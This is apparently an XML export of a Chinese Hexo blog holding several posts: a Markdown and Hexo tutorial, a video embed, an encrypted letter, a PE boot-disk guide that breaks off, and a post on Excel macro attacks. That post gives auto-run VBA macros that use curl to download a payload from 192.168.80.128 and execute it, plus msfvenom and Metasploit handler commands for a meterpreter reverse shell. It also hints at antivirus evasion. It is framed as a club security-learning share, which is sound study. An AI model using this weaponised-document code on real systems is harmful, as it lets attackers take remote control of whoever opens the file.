<p>最后，我们在页面中添加了一个<code>&lt;p&gt;</code>元素，并将其<code>id</code>属性设置为<code>"countdown-text"</code>，用于显示倒计时提示或替换后的新文本。在计时器停止时，我们使用JavaScript修改了该元素的文本内容，将倒计时提示替换为需要显示的新文本。同时在单击事件监听器中补充添加了一行代码，用于在停止计时器时替换倒计时提示为“欢迎访问”文本。这样，无论是计时器正常结束还是被单击事件停止，都会显示“欢迎访问”文本。</p>
]]></content>
      <categories>
        <category>随手记</category>
      </categories>
      <tags>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo操作 &amp; Markdown语法</title>
    <url>/2022/01/13/hexo/</url>
    <content><![CDATA[<h1>发布文章</h1>
<h2 id="进入博客所在目录-右键打开-Git-Bash-Here-创建博文">进入博客所在目录,右键打开 Git Bash Here,创建博文:</h2>
<p><code>hexo new My New Post</code></p>
<p>然后 source 文件夹中会出现一个 My New <a href="http://Post.md">Post.md</a> 文件,就可以使用 Markdown 编辑器在该文件中撰写文章了。<br>
写完后运行下面代码将文章渲染并部署到 GitHub Pages 上完成发布。以后每次发布文章都是这两条命令。</p>
<p><code>hexo g   # 生成页面</code></p>
<p><code>hexo d   # 部署发布</code></p>
<p>也可以不使用命令自己创建 .md 文件,只需在文件开头手动加入如下格式 Front-matter 即可,写完后运行 <code>hexo g</code> 和 <code>hexo d</code> 发布。</p>
<blockquote>
<p>title: Hexo操作 &amp; Markdown语法<br>
date: 1642042606000<br>
cover: #封面<br>
categories: #分类<br>
tags: #标签</p>
<hr>
<p>正文开始</p>
</blockquote>
<h1>常用命令</h1>
<blockquote>
<p>hexo new “name”       # 新建文章<br>
hexo new page “name”  # 新建页面<br>
hexo g                # 生成页面<br>
hexo d                # 部署<br>
hexo g -d             # 生成页面并部署<br>
hexo s                # 本地预览<br>
hexo clean            # 清除缓存和已生成的静态文件</p>
<p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d       #一步到位</p>
</blockquote>
<h1>显示文章摘要（不适用于Butterfly主题）</h1>
<p>Hexo 主页文章列表默认会显示文章全文,浏览时很不方便,可以在文章中插入<code>&lt;!–more–&gt;</code>进行分段。</p>
<p>该代码前面的内容会作为摘要显示,而后面的内容会替换为 “Read More” 隐藏起来。</p>
<h1>Markdown语法</h1>
<h3 id="基本语法">基本语法</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#### 标题</span><br><span class="line">* # 这是一号标题H1</span><br><span class="line">* ## 这是二号标题H2</span><br><span class="line">* ### 这是三号标题H3</span><br><span class="line">* #### 这是四号标题H4</span><br><span class="line">* ##### 这是五号标题H5</span><br><span class="line">* ###### 这是六号标题H6</span><br><span class="line">* 这不是标题而是正文内容</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>
<h1>这是一号标题H1</h1>
</li>
<li>
<h2 id="这是二号标题H2">这是二号标题H2</h2>
</li>
<li>
<h3 id="这是三号标题H3">这是三号标题H3</h3>
</li>
<li>
<h4 id="这是四号标题H4">这是四号标题H4</h4>
</li>
<li>
<h5 id="这是五号标题H5">这是五号标题H5</h5>
</li>
<li>
<h6 id="这是六号标题H6">这是六号标题H6</h6>
</li>
<li>
<p>这不是标题而是正文内容</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#### 强调</span><br><span class="line">* 斜体 = 两边分别加一个 `*` 或 `_`;</span><br><span class="line">* 粗体 = 两边分别加两个 `*` 或 `_`;</span><br><span class="line">* 粗体加斜体 = 两边分别加三个 `*` 或 `_`;</span><br><span class="line">* 删除线 = 两边分别加两个 `~`;</span><br><span class="line">* 上标 = 两边分别加一个 `~`;</span><br><span class="line">* 下标 = 两边分别加一个 `^`;</span><br><span class="line">* 下划线 = 两边分别加两个以上 `+`;</span><br><span class="line">* 着色 = 两边分别加两个以上 `=`;</span><br><span class="line">* 定义缩写 = `*[缩写]`;</span><br><span class="line">* 下面是一个列子:</span><br><span class="line"></span><br><span class="line">*一个星号斜体*</span><br><span class="line">_一个下划线斜体_</span><br><span class="line">**两个星号粗体**</span><br><span class="line">__两个下划线粗体__</span><br><span class="line">***三个星号粗体加斜体***</span><br><span class="line">___三个下划线粗体加斜体___</span><br><span class="line">~~删除我~~</span><br><span class="line">请 ==收藏== 我的博客</span><br><span class="line"></span><br><span class="line">*[HTML]: 超文本链接标示语言</span><br></pre></td></tr></tbody></table></figure>
<h4 id="强调">强调</h4>
<ul>
<li>斜体 = 两边分别加一个 <code>*</code> 或 <code>_</code>;</li>
<li>粗体 = 两边分别加两个 <code>*</code> 或 <code>_</code>;</li>
<li>粗体加斜体 = 两边分别加三个 <code>*</code> 或 <code>_</code>;</li>
<li>删除线 = 两边分别加两个 <code>~</code>;</li>
<li>上标 = 两边分别加一个 <code>~</code>;</li>
<li>下标 = 两边分别加一个 <code>^</code>;</li>
<li>下划线 = 两边分别加两个以上 <code>+</code>;</li>
<li>着色 = 两边分别加两个以上 <code>=</code>;</li>
<li>定义缩写 = <code>*[缩写]</code>;</li>
<li>下面是一个列子:</li>
</ul>
<p><em>一个星号斜体</em><br>
<em>一个下划线斜体</em><br>
<strong>两个星号粗体</strong><br>
<strong>两个下划线粗体</strong><br>
<em><strong>三个星号粗体加斜体</strong></em><br>
<em><strong>三个下划线粗体加斜体</strong></em><br>
<s>删除我</s></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#### 引用</span><br><span class="line">&gt; 这是一个包含两个段落的引用。</span><br><span class="line">&gt; 在每个段落里都有多行内容。</span><br><span class="line">&gt; </span><br><span class="line">&gt; &gt;这是一个包含两个段落的引用。</span><br><span class="line">&gt; &gt;在每个段落里都有多行内容。</span><br></pre></td></tr></tbody></table></figure>
<h4 id="引用">引用</h4>
<blockquote>
<p>这是一个包含两个段落的引用。<br>
在每个段落里都有多行内容。</p>
<blockquote>
<p>这是一个包含两个段落的引用。<br>
在每个段落里都有多行内容。</p>
</blockquote>
</blockquote>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#### 列表</span><br><span class="line">可以在行的最前面放一个 `*`, `+` 或 `-`来表示无序列表:</span><br><span class="line">*   红色</span><br><span class="line">*   绿色</span><br><span class="line">*   蓝色</span><br><span class="line">    * 深蓝色</span><br><span class="line">    * 浅蓝色</span><br></pre></td></tr></tbody></table></figure>
<h4 id="列表">列表</h4>
<p>可以在行的最前面放一个 <code>*</code>, <code>+</code> 或 <code>-</code>来表示无序列表:</p>
<ul>
<li>红色</li>
<li>绿色</li>
<li>蓝色
<ul>
<li>深蓝色</li>
<li>浅蓝色</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#### 水平线</span><br><span class="line">你可以通过将三个或更多的短横线、星号或下划线放在单独的一行来产生一个水平线。如果你愿意,你可以它们之间加入空格。下面的每一行都会产生一个相同水平线:</span><br><span class="line"></span><br><span class="line">**********************************</span><br><span class="line">* * *</span><br><span class="line">----------------------------------</span><br><span class="line">-  -  - </span><br><span class="line">__________________________________</span><br><span class="line">_ _ _</span><br></pre></td></tr></tbody></table></figure>
<h4 id="水平线">水平线</h4>
<p>你可以通过将三个或更多的短横线、星号或下划线放在单独的一行来产生一个水平线。如果你愿意,你可以它们之间加入空格。下面的每一行都会产生一个相同水平线:</p>
<hr>
<hr>
<hr>
<hr>
<hr>
<hr>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#### 链接</span><br><span class="line">我常用的搜索引擎有: [谷歌](http://www.google.com), [必应](http://www.bing.com) 和 [百度](http://www.baidu.com).</span><br><span class="line">我常用的搜索引擎有: [谷歌][1], [必应][2] 和 [百度][3].</span><br><span class="line">我常用的搜索引擎有: [谷歌][谷歌], [必应][必应] 和 [百度][百度].</span><br><span class="line">我常用的搜索引擎有: [谷歌][], [必应][] 和 [百度][].</span><br><span class="line">我常用的搜索引擎有: &lt;http://www.google.com&gt;, &lt;http://www.bing.com&gt; 和 &lt;http://www.baidu.com&gt;.</span><br><span class="line"></span><br><span class="line">然后你可以定义下面的链接,并把它们放在文档中任何你希望的地方。它们不会直接显示出来,而是只会被上面的链接所使用。</span><br><span class="line"></span><br><span class="line">[1]: http://www.google.com/        "谷歌"</span><br><span class="line">[2]: http://www.bing.com/ 	"必应"</span><br><span class="line">[3]: http://www.baidu.com/   	 "百度"</span><br><span class="line"></span><br><span class="line">[谷歌]: http://www.google.com/ "谷歌"</span><br><span class="line">[必应]: http://www.bing.com/ 	 "必应"</span><br><span class="line">[百度]: http://www.baidu.com/   "百度"</span><br></pre></td></tr></tbody></table></figure>
<h4 id="链接">链接</h4>
<p>我常用的搜索引擎有: <a href="http://www.google.com">谷歌</a>, <a href="http://www.bing.com">必应</a> 和 <a href="http://www.baidu.com">百度</a>.<br>
我常用的搜索引擎有: <a href="http://www.google.com/" title="谷歌">谷歌</a>, <a href="http://www.bing.com/" title="必应">必应</a> 和 <a href="http://www.baidu.com/" title="百度">百度</a>.<br>
我常用的搜索引擎有: <a href="http://www.google.com/" title="谷歌">谷歌</a>, <a href="http://www.bing.com/" title="必应">必应</a> 和 <a href="http://www.baidu.com/" title="百度">百度</a>.<br>
我常用的搜索引擎有: <a href="http://www.google.com/" title="谷歌">谷歌</a>, <a href="http://www.bing.com/" title="必应">必应</a> 和 <a href="http://www.baidu.com/" title="百度">百度</a>.<br>
我常用的搜索引擎有: <a href="http://www.google.com">http://www.google.com</a>, <a href="http://www.bing.com">http://www.bing.com</a> 和 <a href="http://www.baidu.com">http://www.baidu.com</a>.</p>
<p>然后你可以定义下面的链接,并把它们放在文档中任何你希望的地方。它们不会直接显示出来,而是只会被上面的链接所使用。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#### 反斜杠</span><br><span class="line">Markdown里面可以使用反斜杠转意下面的字符(因为它们有特别的含义,所以当你希望看到它们本身的时候需要转意):</span><br><span class="line">* \\   反斜杠</span><br><span class="line">* \`   反引号</span><br><span class="line">* \*   星号</span><br><span class="line">* \_   下划线</span><br><span class="line">* \{\}  大括号</span><br><span class="line">* \[\]  中括号</span><br><span class="line">* \(\)  小括号</span><br><span class="line">* \#   井号</span><br><span class="line">* \+   加号</span><br><span class="line">* \-   减号</span><br><span class="line">* \.   点号</span><br><span class="line">* \!   惊叹号</span><br></pre></td></tr></tbody></table></figure>
<h4 id="反斜杠">反斜杠</h4>
<p>Markdown里面可以使用反斜杠转意下面的字符(因为它们有特别的含义,所以当你希望看到它们本身的时候需要转意):</p>
<ul>
<li>\   反斜杠</li>
<li>`   反引号</li>
<li>*   星号</li>
<li>_   下划线</li>
<li>{}  大括号</li>
<li>[]  中括号</li>
<li>()  小括号</li>
<li>#   井号</li>
<li>+   加号</li>
<li>-   减号</li>
<li>.   点号</li>
<li>!   惊叹号</li>
</ul>
<h4 id="内嵌HTML">内嵌HTML</h4>
<p>对于任何没有被Markdown语法与重新定义的HTML内容你都可以在Makdown文档中直接使。你不需要加特别的标记来告诉解析器你是在使用Markdown还是在使用HTML。你需要的只是HTML标签本身。</p>
<p>唯一需要注意的是那些像&lt;div&gt;, &lt;table&gt;, &lt;pre&gt;, &lt;p&gt;等的块标签需要在前后加上一个空行,并且开头和结束标签本身前面没有空格或tab键。Markdown不会再自动在这些块标签前后加上多余的&lt;p&gt;。</p>
<p>例如你可以直接在Markdown文档中使用下面的HTML来画一张表:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">	&lt;tr&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;一些内容&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<table>
    <tbody><tr>
        <td>一些内容</td>
        <td>一些内容</td>
        <td>一些内容</td>
    </tr>
	<tr>
        <td>一些内容</td>
        <td>一些内容</td>
        <td>一些内容</td>
    </tr>
    <tr>
        <td>一些内容</td>
        <td>一些内容</td>
        <td>一些内容</td>
    </tr>
</tbody></table>
<h1>基于 Butterfly 的外挂标签引入</h1>
<p>本站使用了糖果屋的插件Tag Plugins Plus，更多语法内容详见<a href="https://akilar.top/posts/615e2dec/#%E4%B8%8A%E6%A0%87%E6%A0%87%E7%AD%BE-tip">Akilarの糖果屋</a>的教程。</p>
<div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://npm.elemecdn.com/akilar-candyassets/image/siteicon/favicon.ico"></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>某神奇社团的招新视频~</title>
    <url>/2022/07/29/ladybug/</url>
    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
</div>
<div align="center" class="aspect-ratio">
    <iframe src="https://player.bilibili.com/player.html?aid=216487398&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="no" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
    </iframe>
</div>
]]></content>
      <categories>
        <category>视频</category>
      </categories>
      <tags>
        <tag>bilibili</tag>
      </tags>
  </entry>
  <entry>
    <title>2022/9/10，来自广西桂林</title>
    <url>/2022/09/10/letter1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3612f1381621152f5e83954bfcca716232f4473547a194423d62246bf5d3c2e3">79a05bc0503f79b89e0f5d9d72ac9997b09e5d0a25b18f16a09e58ce90dc1e21bb01420021ea6a43e142f7c9163160abf3a14d91734cdb8328d6d609ad5106e899e44c5692ce09afdbd4a329ea905b3ff8efdf03c9a12c5e974c6788d974f481c8dfb7cecd22e3ff945df573b6e37de1818df9a7ca812010c51f53a2f4d2ba689f900e10248e3efbcca1fdbfbbbea5497f025ad24be869a03732a72eddaac9e1536442db45699077aac43b10098af845d025eca6d135ca90ccffb2d96ef163357c8be346e663527a27ccbe490d446202cffa3906b25b09dbfe791af5e2736436629f7ff154b8352b53d65bf81ebc290938a8788107779cb258ab9a3e16cfb9e9dc29e768892fbdfa4a3faa7bb53d2e73a6f0ec0325360034c0d6888ae532558bf1c5a0adaf6a0410a1c6eea5f19689e0b649b36ae8bb45a492722030005b891ca559b21f2df4be6956ec14d053eb01fef087b4d6ec47f49fddcffbd3cb9a23293a2274fe4898ce828596ec2dae4799e2eb244ca9665fd9e2eb0c80108fe2e94c62fbf4d702ecc9ffd64cff3e2521717f3c508a1d868e62a414d797f0266f11c9bb1494684f7d6949e7da49d26b459c5a777877d30ce73d74524d8b65394b1c27495f79a77dc925046d3e1260028c629563289e2afd126478ffdec62a75f47160fa4529d272d329235779b1e23976a5f02b969ae5a2033950dee01f10d308a87c2cf38c59c754e003137ed55799dca1b7a87033c2626f58bf80a1262d1832943a01c83438ff626a2f9cdc0f8f1362ee38f9b22dbca9c00912fb67f3f830cab682bb8d14bd1cab59532da704238747a41b448ffe507002591352bb8556c8e31530fff8bf46274c6863e6e766b2c1ea9c37073f715afa7219ee893a0ee24805e0f3d2d84561f6768a6c6a9380dc79f42a8c7bfa8ee97cbe214cbc89fea30858b59258e0cf185ae53651f518b61ccb33f2d36ec7816ec7cbf5ed95380983f322ec10560e30bf2f305ceef0d9fe27a79c37a0f8b30420329f7f78b1f1fb6a92f4bbbe5ea0dae8cd2fbbd06db4c76ea64309392ef1d419148a931693f4a40bc2bd14078810ae757711932d7655a68743291da34439bbb0d07790480c8d6c96c5d7a231a58374ba830e17ad744d8f0c29bbba0a1193a95ab7e8192924e1dbadb11a97272b9c4473715f2934064964d27f15041a975b5e6010b9d5a1c72159ab26533a2cca792d49a3ff1e0af95de21753df4956e0d4da8d89d69d3c922d20ccf456de4f4ecd5dcf365e6740d69a57d333cdf2e24e47982ec24554b6637e55b06a11e4506f93a888605326d03cbef50d07273859432ac978d25df9fb6f615847611afdb2ad528c797d85a77fbf16a847606975ae85e2492604dc48cf98c71b66176ac5d0eb8628ef5c6442f0e830b7060adf88521b362f8285a3b2ed381f50326cf0878caa176f049ab8ea52f5c68fd5a2118fac38621a6fefb5afa9d247b79750545fa2d2816d10ba765db26254b88c6c4b026531177ba49dbcd2eab7411d7a0b028c6ab3c0e3e4a9e39e40ec5b7b383ec6a6df3d73cd96d915f27526d2c9600e2163b398397e40fe4d31d52cf3dd46e90ce430b01ed5b04c5ff4c96e8da9532324131bfe7fb44875e7c42e7e770cad9f07c7715f1a48443ba033a4926c63bba0e6a1322cc29080b2119043828418a7141192c9bb1784d841b0471cc81d587a05ecf85b2321c53d8014ff43353be47301c6219eafc8d7e8e96b3a684cfba8397f294b9aa8bfe95f1f7cab0a142f91c16503bd062bbc10066696fe160f83834c3ceadac41b9b50601ba165adc6f18bde84ad778087557501649bfbc8e03c1e46123e3d8aca7a95de4fa8ec748887a37bce9835abf78258621f836ceb76972ef9f4b762a3fae7598d67f4c6b0a0a4966a3bd64909683bed79917994526f736ae090a44ada2cd051d2c10bce68ea104455d00b4a130df54388d9ec058eeb57925040dc5bb988257e6b1eaa3798b615d0d07dbea21b294e64fb2ecb9201d0754f208399f56c13483e54bfe65801156b459ed62855c37d0d89ae42498716d8b787066dbdeabdadd8088cac1aa8d92088bfc1dd0aa62cabd6c08de52aac12d9ccb8751cbed21630a883ad7d0627bdd332856bc7a0e4a6b712740b9344b0db85e0942be4309dc8790f873f743f6116b94c5340d598802565acb63d41a95377f8c85b11e2c709af5a081e76c139252aa7d25af53e2f9a5382b67c008c4eed0cc66c7975e9ba0b4d6175b5c01109e0b4253c93e1a312fc99405885e3db98a3abdfdb7e74db4fcdc7fd3b3fda8c81aba3582e9d9a3055aac44134caeaefbeb3c6ce2a29f353f5069fdd7e70bc1348dd31c605e1a2f76b9100d96ec34a5b3b677ce3e86dcfb867366948921ff89a6b47ab40be4d28950d68be0c29976e47b6c1e411afa47b7d7b6264eb73aa01174915b0e94bdf16af8132defc29f0faf9bba3c0dfea698ccde7e7c7ec624923eb5c4a75e65661756548ee0a2044f5b0955e80862953e23c5bd6233dcd08c76a6ef7812b1725dedadb7cc928ee460ecf01dd1b68813919eebc7a5337f869f0e5d7662cc6592f3df22288141d0d8c3e47c715985a9cc8487d243832f702fc20c5f9bcfba36db021458fd0168fd99f8238c70e7bbd9d3c8f498f5fba182e65006573fbc13588f852bb5e1f175c5299cdf33ff67642366f6c30e928aa913ece10bd7cf9cbcb274b0847baf9dc11425820656dd30e8ade33fa20c3a084cba1f3cf1e97f278d4c3dcd07dc417745807273d30a28b53fcd0aff08a0b134bda45a9914cf4f966e66dce8a3c51db6a9cbdb29ec3da6d1dc6a77baedab94a41fe3c6df2b1ff0c3a4d701a5f7cca201b2d08f4e42d168c653d6493a9639b60105c759781821d0cc645ce608a7a04b033dc3a74042a816cbdddd587de09f63233fae0aaea83016368c91a7d13f226d3ba937537f58e7d70832c88e0ac4759d5c6910f80bae1fdf26910815f5c88220f8d2f5d2f3f88faf0ad61a0c6c686d8e20d30420d7110b18ea46e6cf6d2abc1357f622c8a6de764953d30fc0400adacc0ba719a35d8892b63ca329720b1145367ef27486597bd798e4cd19baaa86313b56f34273e8d304ca8e4e644483ec5b3d337a367a8a0494b7ec07d8d6eb0459c3feae774d125cc76e68dd097872f58b52f7af4616d2b805bd899e54fb046e5ff16c6cb3e612c246189b2bb42d75b7829fa03e17afcd69d2acbe41ec56eafc4594c8a5fd1c0bc15410e4c4f16c7ec987dccbdd249f09e0169b0dc2bcb15a0a862fda4ba0bfafcbe340afc36dc45df19c5c93838e51a1583df9649591f24307768b0c172eb7a717f0a19d79aa969ef613e8d8d439a5fa030ebea5c6cdbd99df136ae33c3bf004111d0f4cfebd557d8566269cfaaf48f8ced873a92726fdc385c3571af73cce4eec8ee8d1f9a64fb58399d5669363452336dee2da3d6a58448c67dc9f33ad4ca0b4a06fdfbc5b9c6902b6ac95b03ea7745750f56099fac3c0de01bafc922b323225d2f84c21fa18bf2e534bfc9b1f62288fd5841ef0ae81f1807e7a0702b74909553cf8ae6b8448a4ec2faf974444509a94951878f0f67a9ecd9aaf0ba183e003ac5601756c2cd608c84d9dea90e225ce8d66e95e0f4d24b1afa83c4a783faca8b96233168faabd75a61b1569f489da3aa219d536f95658f2743ca1b8719</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-up">
      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，密码在明信片上哦</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>反弹Shell:通过Excel表格进行远控</title>
    <url>/2023/04/02/officevba/</url>
    <content><![CDATA[<h1>讲在前面</h1>
<p>很久没有更新啦，自从12月新冠开始再加上过年和开学考试<s>再加上亿点点的划水</s>，不知不觉就过去这么久了。那么今天刚好开完了社团的分享会，也一起在这里更新一下内容，也算是作为这次分享的记录了。</p>
<hr>
<h1>什么是宏？</h1>
<p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。</p>
<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。</p>
<h1>如何利用？</h1>
<p>我们创建一个启用宏的excel表格，例如<code>值日名单.xlsm</code>。</p>
<p>点击<code>视图</code>-<code>宏</code>-<code>查看宏</code>，在这里创建一个<code>AutoOpen</code></p>
<p><img src="https://img.anineg.space/vba2.png" alt=""></p>
<h2 id="1-弹出计算器">1.弹出计算器</h2>
<p>在弹出的VBA中，修改为如下代码，点击运行，即可弹出计算器。</p>
<p><img src="https://img.anineg.space/vba4-1.png" alt=""></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    LaunchCalculator</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub LaunchCalculator()</span><br><span class="line">    Shell "calc"</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
<p>原理其实就是在shell中输入<code>calc</code>，启动计算器。</p>
<h3 id="启动Excel时自动执行">启动Excel时自动执行</h3>
<p>在左侧<code>ThisWorkbook</code>中添加如下代码：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Private Sub Workbook_Open()</span><br><span class="line">    Call AutoOpen</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img.anineg.space/vba5.png" alt=""></p>
<p>可以令excel在启动时自动运行<code>AutoOpen</code></p>
<h2 id="2-浏览器全屏访问指定网页">2.浏览器全屏访问指定网页</h2>
<p>以火狐浏览器为例：</p>
<p>代码如下，其中</p>
<p><code>firefoxPath</code>是指火狐浏览器的安装路径。</p>
<p><code>websiteURL</code>是指要打开的网页。</p>
<p><code>--kiosk</code>是指定浏览器全屏模式启动，也可以修改为<code>-url</code>以普通模式启动。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    OpenWeb</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub OpenWeb()</span><br><span class="line">    Dim firefoxPath As String</span><br><span class="line">    Dim websiteURL As String</span><br><span class="line">    </span><br><span class="line">    firefoxPath = "C:\Program Files\Mozilla Firefox\firefox.exe"</span><br><span class="line">    websiteURL = "https://anineg.space/"</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Call Shell(firefoxPath &amp; " --kiosk " &amp; websiteURL, vbNormalFocus)</span><br><span class="line">End Sub</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="3-利用反弹shell控制">3.利用反弹shell控制</h2>
<p>在KALI（IP:192.168.80.128） 中生成<code>nc.exe</code>，具体过程不再详细叙述，给出命令行如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line"></span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line">use windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.128 lport=4444 -f exe -o nc.exe</span><br></pre></td></tr></tbody></table></figure>
<p>现在在<code>/var/www/html</code>路径下有<code>nc.exe</code>文件，我们需要它能够在Windows上被下载，所以我们启动web服务：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start apache2.service</span><br></pre></td></tr></tbody></table></figure>
<p>如果此时在Windows浏览器中打开：<code>http://192.168.80.128/nc.exe</code> ，文件就可以被下载了。</p>
<p>回到Excel中，修改代码如下：</p>
<p>原理同上，就是使用<code>curl</code>帮我们下载文件，然后在cmd中直接运行。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    Downloadandopen</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Downloadandopen()</span><br><span class="line">    Dim curlPath As String</span><br><span class="line">    Dim fileURL As String</span><br><span class="line">    Dim downloadedFilePath As String</span><br><span class="line">    Dim command As String</span><br><span class="line">    </span><br><span class="line">    curlPath = "C:\Windows\System32\curl.exe"</span><br><span class="line">    fileURL = "http://192.168.80.128/nc.exe"</span><br><span class="line">    downloadedFilePath = "C:\Users\Administrator\Desktop\nc.exe"</span><br><span class="line">    </span><br><span class="line">    command = curlPath &amp; " -o " &amp; downloadedFilePath &amp; " " &amp; fileURL</span><br><span class="line">    Call Shell(command, vbNormalFocus)</span><br><span class="line"></span><br><span class="line">    Call Shell(downloadedFilePath, vbNormalFocus)</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
<p>与此同时，在KALI上需要开启监听：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.80.128</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
<p>这样，当Excel表格在启动时就会自动连接至攻击机，渗透完成。</p>
<p><img src="https://img.anineg.space/vba6.png" alt=""></p>
<p>当然，对<code>nc.exe</code>做一下免杀效果会更好，如果以后有机会我会在这里继续更新一下，</p>
<hr>
<p>本测试仅作学习原理探究，严禁去做违法的事情！</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>渗透</tag>
        <tag>分享会</tag>
      </tags>
  </entry>
  <entry>
    <title>PE启动盘的制作</title>
    <url>/2022/03/12/pe/</url>
    <content><![CDATA[<h1>下载制作工具</h1>
<ul>
<li>制作启动盘推荐使用<a href="https://www.upe.net/">优启通</a>，相对<s>大白菜，老毛桃</s>等工具而言相当简洁干净，不会对通过启动盘安装的系统安装预装软件。</li>
</ul>
<p><img src="https://img.anineg.space//202203121319518.png" alt="图片1"></p>
<center>优启通官网</center>
<details class="folding-tag" cyan="" open=""><summary> 制作工具下载链接： </summary>
              <div class="content">
              <div class="tag link"><a class="link-card" title="百度云(密码:txna)" href="https://pan.baidu.com/share/init?surl=Gh20ukCe973YuMs6D84SuQ"><div class="left"><img src="https://img.anineg.space//202203121335021.png"></div><div class="right"><p class="text">百度云(密码:txna)</p><p class="url">https://pan.baidu.com/share/init?surl=Gh20ukCe973YuMs6D84SuQ</p></div></a></div>
              </div>
            </details>
<h1>制作启动盘</h1>
<ul>
<li>下载完成后，解压，运行exe文件。选择需要制作的U盘，同时可以选择为PE系统添加自己喜欢的壁纸。</li>
</ul>
<p><img src="https://img.anineg.space//202203121321357.png" alt="图片2"></p>
<center>制作界面</center>
<h1>运行启动盘</h1>
<ul>
<li>在这里我使用VM虚拟机运行PE系统，若需要实机运行，请参考教程：</li>
</ul>
<details class="folding-tag"><summary> 电脑设置u盘启动的方法 </summary>
              <div class="content">
